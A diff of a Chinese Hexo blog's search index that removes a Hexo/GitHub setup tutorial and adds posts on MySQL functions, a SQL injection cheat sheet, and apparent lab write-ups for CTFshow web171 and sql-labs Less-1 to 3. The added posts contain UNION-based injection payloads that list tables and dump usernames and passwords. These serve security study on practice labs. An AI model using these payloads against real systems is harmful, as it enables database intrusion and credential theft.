-<h4 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&quot;博客名称&quot;</span> = hexo <span class="keyword">new</span> <span class="string">&quot;博客名称&quot;</span>	<span class="comment">//新建一篇博客</span></span><br><span class="line">hexo g = hexo generate	<span class="comment">//生成</span></span><br><span class="line">hexo s = hexo server	<span class="comment">//启动服务器</span></span><br><span class="line">hexo d = hexo deploy	<span class="comment">//部署</span></span><br></pre></td></tr></table></figure>
-<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo server	<span class="comment">//hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s	<span class="comment">//静态模式</span></span><br><span class="line">hexo server -p <span class="number">5000</span>	<span class="comment">//更改端口</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>	<span class="comment">//自定义 IP地址</span></span><br><span class="line">hexo clean	<span class="comment">//清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure>
-<h1 id="github仓库的创建"><a href="#github仓库的创建" class="headerlink" title="github仓库的创建"></a>github仓库的创建</h1><p>好了，到这里确保上方操作无误即可进行github仓库的创建(但首先你得先有个github账号哦)。<br>进入github主页，选择左上角的new：<br><img src="https://img-blog.csdnimg.cn/20210112173349599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>进入后输入仓库名称，必须要与owner下的名称一致，输入完后点击创建即可<br>我已经创建过仓库了，所以会提示<br><img src="https://img-blog.csdnimg.cn/20210112173512148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
-<p>进入git bash中，按顺序输入如下代码：</p>
-<blockquote>
-<p>git config –global user.email “<a href="mailto:&#x78;&#120;&#x78;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;">&#x78;&#120;&#x78;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;</a>“    //填写注册github的邮箱</p>
-</blockquote>
-<blockquote>
-<p>git config –global user.name “xxxx”    //github 用户名</p>
-</blockquote>
-<blockquote>
-<p>ssh-keygen    //输入完这个就一致enter就行了</p>
-</blockquote>
-<p>然后进入用户目录下的.ssh，打开id_rsa.pub，复制里面的内容。</p>
-<p>进入github，新建一个SSH就可以了：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210112180408871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="sublime的安装使用"><a href="#sublime的安装使用" class="headerlink" title="sublime的安装使用"></a>sublime的安装使用</h1><p>sublime是一个好用的文本编辑器。</p>
-<p>1、sublime下载<br>可以去官网下载：<a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a><br>也可以云盘下载：<a href="https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw">https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw</a> 提取码：42pf </p>
-<p>2、选择一个除C盘外的安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112203141300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后点击next，安装完成：<br><img src="https://img-blog.csdnimg.cn/20210112203231376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、将博客目录拖入sublime：<br><img src="https://img-blog.csdnimg.cn/20210112210759495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="Hexo与github连接"><a href="#Hexo与github连接" class="headerlink" title="Hexo与github连接"></a>Hexo与github连接</h1><p>1、在sublime中打开_config.yml，将Deployment改为：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lucifer-rossweisse/lucifer-rossweisse.github.io.git	</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-<p>其中”repo”内填写github仓库中的SSH链接<br><img src="https://img-blog.csdnimg.cn/20210112211302998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、将”url”后改为”<a href="http://github项目名&quot;/">http://github项目名&quot;</a><br><img src="https://img-blog.csdnimg.cn/20210112211442895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、在命令行中输入下列代码，安装插件，上传博客</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email <span class="string">&quot;github邮箱&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;github用户名&quot;</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-<p>4、在浏览器中输入博客网址，也是github仓库名，即可查看(有时候需要等一会)<br><img src="https://img-blog.csdnimg.cn/20210112211855757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="Hexo的主题切换"><a href="#Hexo的主题切换" class="headerlink" title="Hexo的主题切换"></a>Hexo的主题切换</h1><p>其实前面已经把重要的部分整完了，最后就换一个自己喜欢的主题就好了。</p>
-<p>主题可以从github上搜hexo-them进行查找，比较受欢迎的是next和yilia这两个主题，以next为主，之后主题的切换都可以这么来。</p>
-<p>1、进入博客文件夹，打开git bash，输入以下代码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
-<p>安装完后可以看到博客文件夹中的themes里出现了一个next文件夹，这就是我们下载的next主题。<br><img src="https://img-blog.csdnimg.cn/20210112212458400.png"><br>2、修改主题配置文件，进入博客文件夹中的_config.yml修改主题<br><img src="https://img-blog.csdnimg.cn/20210112212618350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后先在本地测试一下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210112212918907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<p>4、最后直接上传发布博客就好了</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-<p>注意：hexo在5.0之后把swig给删除了，需要自己手动安装，不然安装next主题后会显示错误<br>输入下面这串代码安装</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
-<p>然后hexo c清理缓存，hexo g &amp; s即可。</p>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>全部的搭建步骤已经讲完了，写篇博客其实只是为了记录一下自己学习的搭建过程，如果对你有帮助的话，可以分享给你的朋友哦(￣▽￣)”</p>
-]]></content>
-      <tags>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -197,8 +204,299 @@
 <p>简而言之，多态就是自定义多个方法使接口类实现一件事情的达成。φ(*￣0￣)</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>面向对象其实就是环绕类进行拓展，将数据、方法封装进类中，而类又可以创建对象。多态则可以使类增加多种不同的方法，而继承可以使类在原有基础上进行扩展，使类拥有更多的属性、方法。</p>
 ]]></content>
+      <categories>
+        <category>编程学习</category>
+      </categories>
       <tags>
         <tag>other</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mysql相关函数</title>
+    <url>/2021/02/05/sql/mysql%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="mysql相关函数"><a href="#mysql相关函数" class="headerlink" title="mysql相关函数"></a>mysql相关函数</h1><table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>返回数据库版本</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>返回数据库名</td>
+</tr>
+<tr>
+<td>user() current_user() system_user()</td>
+<td>返回用户名</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>返回数据库路径</td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>返回操作系统版本</td>
+</tr>
+<tr>
+<td>length()</td>
+<td>返回字符串长度</td>
+</tr>
+<tr>
+<td>substring() substr() mid()</td>
+<td>截取字符串： 参数1：字符串 参数2：起始位置，索引从1开始 参数3：截取长度</td>
+</tr>
+<tr>
+<td>concat()</td>
+<td>不带分隔符链接字符串</td>
+</tr>
+<tr>
+<td>concat_ws()</td>
+<td>带分隔符链接字符串： concat_ws(’-’,‘a’,‘b’,‘c’)</td>
+</tr>
+<tr>
+<td>group_concat()</td>
+<td>链接一组查询结果字符串</td>
+</tr>
+<tr>
+<td>ord() ascii()</td>
+<td>返回字符串的ASCII值</td>
+</tr>
+<tr>
+<td>left()</td>
+<td>从左边开始截取字符串： 参数1：字符串 参数2：截取的长度</td>
+</tr>
+<tr>
+<td>rand()</td>
+<td>返回0-1之间的浮点数</td>
+</tr>
+<tr>
+<td>round()</td>
+<td>四舍五入： round(4.2323151,2)–&gt;4.23</td>
+</tr>
+<tr>
+<td>floor()</td>
+<td>向下取整</td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>返回读取文件的内容，返回字符串类型</td>
+</tr>
+<tr>
+<td>if()</td>
+<td>判断：if(exp1,exp2,exp3): 如果exp1为真，返回exp2，否则返回exp3</td>
+</tr>
+<tr>
+<td>updatexml()</td>
+<td>报错注入可以用到的函数，如果参数2格式不正确，会报错误信息，此时将需要的函数填在这里就会爆出需要的信息 参数1：string格式，为xml文档对象的名称 参数2：xpath格式的字符串 参数3：string格式，替换查找到的符合条件的数据</td>
+</tr>
+<tr>
+<td>addslashes()</td>
+<td>转义特殊字符（’ “ \）</td>
+</tr>
+<tr>
+<td>hex()</td>
+<td>将字符串转换为16进制</td>
+</tr>
+<tr>
+<td>unhex()</td>
+<td></td>
+</tr>
+<tr>
+<td>limit m,n</td>
+<td>从m开始 查找n条（索引从0开始）</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>mysql</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入基本语句</title>
+    <url>/2021/02/05/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
+    <content><![CDATA[<h1 id="sql注入基本语句"><a href="#sql注入基本语句" class="headerlink" title="sql注入基本语句"></a>sql注入基本语句</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 4 -- -</span><br><span class="line">判断有多少列</span><br><span class="line">union select 1,2,3 -- -</span><br><span class="line">判断数据显示点</span><br><span class="line">union select 1,user(),database()­­ -- -</span><br><span class="line">显示出登录用户和数据库名</span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39; ),3 -- -</span><br><span class="line">查看数据库有哪些表</span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;users&#39; ),3 -- -</span><br><span class="line">查看对应表有哪些列</span><br><span class="line">union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -</span><br><span class="line">查看账号密码信息</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFshow web入门 sql171</title>
+    <url>/2021/02/05/sql/ctfshow%20sql/CTF%20show%20web%E5%85%A5%E9%97%A8%20sql171/</url>
+    <content><![CDATA[<h1 id="CTF-show-web入门-sql171"><a href="#CTF-show-web入门-sql171" class="headerlink" title="CTF show web入门 sql171"></a>CTF show web入门 sql171</h1><p>已给出提示：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>首先判断注入点</p>
+</blockquote>
+<blockquote>
+<p>id=1’ and 1=1</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/9U6EiFkXMmwRSs2.png"></p>
+<p>没报错也没有显示任何信息，将1=1改为1=2</p>
+<blockquote>
+<p>id=1’ and 1=2</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/FXTQiKxhHpVrZjd.png"></p>
+<p>还是没有显示任何信息，说明可以使用 ‘ 字符注入</p>
+<p>然后开始判断表有多少列</p>
+<blockquote>
+<p>id=1’ order by 1,2,3 –+</p>
+</blockquote>
+<p>没反应</p>
+<p><img src="https://i.loli.net/2021/02/05/jnTi2wbpoHSBkue.png"></p>
+<blockquote>
+<p>id=1’ order by 1,2,3,4 –+</p>
+</blockquote>
+<p>出现异常，说明只有三列</p>
+<p><img src="https://i.loli.net/2021/02/05/fPsqkn8cAWdjeaz.png"></p>
+<p>查询用户，数据库</p>
+<blockquote>
+<p>id=1’ union select 1,user(),database() –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/gtLK6UswnpauWTG.png"></p>
+<p>查询该数据库下有哪些表</p>
+<blockquote>
+<p>id=1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’ctfshow_web’),3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/1ZKLyMdUhCrOups.png"></p>
+<p>知道表名就可以查询表里的内容了</p>
+<blockquote>
+<p>id=1’ union select id,username,password from ctfshow_user –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/JAKy1loSUkWsniw.png"></p>
+<p>拿到flag</p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql-labs-Less-1</title>
+    <url>/2021/02/05/sql/sql-labs/Less-1/</url>
+    <content><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>进去后老套路</p>
+<p>先测试一下注入点</p>
+<blockquote>
+<p>id=1’ and 1=1 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/716bURrIkHvdghZ.png"></p>
+<p>把1=1换成1=2</p>
+<blockquote>
+<p>id=1‘  and 1=2 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/W94PQrOUdMwizRN.png"></p>
+<p>发现没有报错，也没有显示错误信息，说明可以使用 ‘ 字符注入</p>
+<p>查询有多少列</p>
+<blockquote>
+<p>id=1’ order by 4 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/nbUFEVivXjhC9ZD.png"></p>
+<p>出现错误，证明表中只有三列</p>
+<p>判断显示点</p>
+<blockquote>
+<p>id=-1’ union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/TJrIBv4LbEM91Hf.png"></p>
+<p>查询用户，数据库</p>
+<blockquote>
+<p>id=-1’ union select 1,user(),database() –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/gke8dh1tWM3fyKb.png"></p>
+<p>查询用户名，密码</p>
+<blockquote>
+<p>id=-1’ union select 1,(select group_concat(concat_ws(‘—‘,username,password)) from users),3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/LjZUphumTacglvb.png"></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sql-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql-labs-Less-3</title>
+    <url>/2021/02/05/sql/sql-labs/Less-3/</url>
+    <content><![CDATA[<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>提示是弯曲的字符，可以猜测可能是 ) 字符注入</p>
+<p>可以直接去看代码验证</p>
+<p><img src="https://i.loli.net/2021/02/05/jG6crsE7zpedyBm.png"></p>
+<p>知道了注入点，就开始老套路</p>
+<p>查询列数</p>
+<blockquote>
+<p>id=1’) order by 4 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/zj5PJTWx1VmGRAM.png"></p>
+<p>查询显示点</p>
+<blockquote>
+<p>id=-1’) union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/hb2Cf5GMTVcQkun.png"></p>
+<p>查询用户名，密码</p>
+<blockquote>
+<p>id=-1’) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/SzRcalgCXLOkmyw.png"></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sql-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql-labs-Less-2</title>
+    <url>/2021/02/05/sql/sql-labs/Less-2/</url>
+    <content><![CDATA[<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>由提示知道是整数型注入</p>
+<p>老套路</p>
+<blockquote>
+<p>id=1 and 1=1 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/WQwvVTFnXJ5uZLk.png"></p>
+<p>吧1=1换成1=2</p>
+<blockquote>
+<p>id=1 and 1=2 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/KArDL278xCdeFfz.png"></p>
+<p>没有错误，也没有回显，说明为数字型注入</p>
+<p>查询有多少列</p>
+<blockquote>
+<p>id=1 order by 4 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/XVn3rlqwRDE72mc.png"></p>
+<p>查询显示点</p>
+<blockquote>
+<p>id=-1 union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/eLAR9GtmOQDx4Kg.png"></p>
+<p>查询用户名，密码</p>
+<blockquote>
+<p>id=-1 union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/Ct1aSrnvK3cE8Yz.png"></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sql-labs</tag>
       </tags>
   </entry>
 </search>
